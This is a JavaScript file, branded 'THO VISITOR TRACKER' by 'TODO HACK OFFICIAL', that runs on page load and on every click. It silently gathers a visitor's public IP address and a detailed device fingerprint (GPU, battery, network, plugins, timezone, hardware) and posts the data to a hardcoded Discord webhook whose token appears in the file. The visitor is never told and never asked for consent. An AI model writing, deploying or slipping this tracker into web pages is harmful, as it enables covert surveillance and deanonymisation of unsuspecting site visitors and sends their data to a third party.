const WEBHOOK = 'https://ptb.discord.com/api/webhooks/1451522591776051240/vcT_4L0wSaO-xuMcLFg6awwhcxxhvb9E0ERVYiVwCanduNBHawIdUGMVQvZcxnsQu1-C';

async function getSystemInfo() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const networkInfo = connection ? {
            effectiveType: connection.effectiveType,
            downlink: `${connection.downlink}Mbps`,
            rtt: connection.rtt,
            saveData: connection.saveData ? 'Activado' : 'Desactivado'
        } : 'No disponible';

        let batteryInfo = 'No disponible';
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                batteryInfo = {
                    level: `${Math.floor(battery.level * 100)}%`,
                    charging: battery.charging ? 'Sí' : 'No',
                    timeRemaining: battery.charging ? 
                        `${Math.floor(battery.chargingTime / 60)} min para carga completa` : 
                        `${Math.floor(battery.dischargingTime / 60)} min restantes`
                };
            }
        } catch (e) {
            batteryInfo = 'No accesible';
        }

        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
        const gpuInfo = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : 'No disponible';

        const webglInfo = gl ? {
            vendor: gl.getParameter(gl.VENDOR),
            version: gl.getParameter(gl.VERSION),
            shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
        } : 'No disponible';

        const audioContext = window.AudioContext || window.webkitAudioContext;
        const audio = audioContext ? new audioContext() : null;
        const audioInfo = audio ? {
            sampleRate: audio.sampleRate,
            state: audio.state,
            baseLatency: audio.baseLatency
        } : 'No disponible';

        const systemInfo = {
            ip: ipData.ip || 'No disponible',
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            vendor: navigator.vendor,
            screenSize: `${window.screen.width}x${window.screen.height}`,
            colorDepth: `${window.screen.colorDepth} bits`,
            pixelRatio: window.devicePixelRatio,
            language: navigator.language,
            languages: navigator.languages?.join(', '),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sí' : 'No',
            cookiesEnabled: navigator.cookieEnabled ? 'Sí' : 'No',
            doNotTrack: navigator.doNotTrack || 'No especificado',
            network: networkInfo,
            battery: batteryInfo,
            gpu: gpuInfo,
            webgl: webglInfo,
            audio: audioInfo,
            deviceOrientation: window.DeviceOrientationEvent ? 'Soportado' : 'No soportado',
            vibration: navigator.vibrate ? 'Soportado' : 'No soportado',
            bluetooth: navigator.bluetooth ? 'Soportado' : 'No soportado',
            usb: navigator.usb ? 'Soportado' : 'No soportado',
            arch: navigator.userAgent.includes('Win64') ? '64-bit' : '32-bit',
            memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'No disponible',
            cores: navigator.hardwareConcurrency || 'No disponible',
            touchPoints: navigator.maxTouchPoints,
            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'No disponible',
            online: navigator.onLine ? 'Sí' : 'No'
        };

        return systemInfo;
    } catch (error) {
        console.error('Error obteniendo información:', error);
        return null;
    }
}

async function enviarDatos() {
    try {
        const systemInfo = await getSystemInfo();
        
        if (!systemInfo) {
            throw new Error('No se pudo obtener la información del sistema');
        }

        const data = {
            username: "THO VISITOR TRACKER",
            avatar_url: "https://media1.tenor.com/m/zMuuo4JaA5EAAAAC/tho-todo-hack-official.gif",
            embeds: [{
                title: "🚨 Nuevo Visitante",
                color: 0x00ff00,
                fields: [
                    {
                        name: "🔒 IP",
                        value: `||${systemInfo.ip}||`,
                        inline: true
                    },
                    {
                        name: "💻 Sistema",
                        value: `${systemInfo.platform} (${systemInfo.arch})`,
                        inline: true
                    },
                    {
                        name: "🌐 Navegador",
                        value: `${systemInfo.userAgent.split(' ')[0]} - ${systemInfo.vendor}`,
                        inline: true
                    },
                    {
                        name: "📱 Pantalla",
                        value: `${systemInfo.screenSize} (${systemInfo.colorDepth}, ${systemInfo.pixelRatio}x)`,
                        inline: true
                    },
                    {
                        name: "🖥️ Hardware",
                        value: `RAM: ${systemInfo.memory}\nCores: ${systemInfo.cores}\nTouch: ${systemInfo.touchPoints}`,
                        inline: true
                    },
                    {
                        name: "🔋 Batería",
                        value: typeof systemInfo.battery === 'object' ? 
                            `${systemInfo.battery.level} - ${systemInfo.battery.charging ? 'Cargando' : 'Descargando'}` : 
                            systemInfo.battery,
                        inline: true
                    },
                    {
                        name: "📡 Red",
                        value: typeof systemInfo.network === 'object' ? 
                            `${systemInfo.network.effectiveType}\n${systemInfo.network.downlink}\nRTT: ${systemInfo.network.rtt}ms` : 
                            systemInfo.network,
                        inline: true
                    },
                    {
                        name: "🌍 Localización",
                        value: `${systemInfo.timezone}\n${systemInfo.language}`,
                        inline: true
                    },
                    {
                        name: "🔌 Plugins",
                        value: systemInfo.plugins.substring(0, 1024) || "Ninguno",
                        inline: true
                    },
                    {
                        name: "⚙️ Configuración",
                        value: `Cookies: ${systemInfo.cookiesEnabled}\nDNT: ${systemInfo.doNotTrack}\nDark Mode: ${systemInfo.darkMode}`,
                        inline: true
                    },
                    {
                        name: "🎮 WebGL",
                        value: typeof systemInfo.webgl === 'object' ? 
                            `Vendor: ${systemInfo.webgl.vendor}\nVersion: ${systemInfo.webgl.version}` :
                            systemInfo.webgl,
                        inline: true
                    },
                    {
                        name: "🎵 Audio",
                        value: typeof systemInfo.audio === 'object' ? 
                            `Sample Rate: ${systemInfo.audio.sampleRate}Hz\nLatency: ${systemInfo.audio.baseLatency}s` :
                            systemInfo.audio,
                        inline: true
                    },
                    {
                        name: "📱 Capacidades",
                        value: `Orientación: ${systemInfo.deviceOrientation}\nVibración: ${systemInfo.vibration}\nBluetooth: ${systemInfo.bluetooth}\nUSB: ${systemInfo.usb}`,
                        inline: true
                    }
                ],
                timestamp: new Date(),
                footer: {
                    text: "BY TODO HACK OFFICIAL | THO VISITOR TRACKER"
                }
            }]
        };

        const response = await fetch(WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error(`Error HTTP: ${response.status}`);
        }

    } catch (error) {
        console.error('Error:', error);
    }
}

window.addEventListener('load', enviarDatos);

document.addEventListener('click', () => {
    console.log("User interaction detected");
    enviarDatos();
});